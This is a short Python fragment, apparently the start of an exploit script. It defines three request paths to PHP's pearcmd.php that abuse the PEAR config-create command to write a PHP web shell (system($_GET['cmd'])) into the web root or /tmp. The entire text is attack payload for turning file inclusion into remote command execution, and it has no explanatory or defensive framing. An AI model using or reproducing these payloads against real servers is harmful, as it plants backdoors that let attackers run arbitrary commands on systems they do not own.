import requests

# Query tokens and output paths corresponding to PEAR config-create arguments.
pear = "/usr/share/php/pearcmd.php?+config-create+/usr/share/php/+<?php system($_GET['cmd']); ?>+/var/wwwroot/shell.php"
temporary = "/usr/share/php/pearcmd.php?+config-create+/usr/share/php/+<?php system($_GET['cmd']); ?>+/tmp/shell.php"
php_output = "/usr/share/php/pearcmd.php?+config-create+/<?php system($_GET['cmd']); ?>+/var/wwwroot/shell.php"
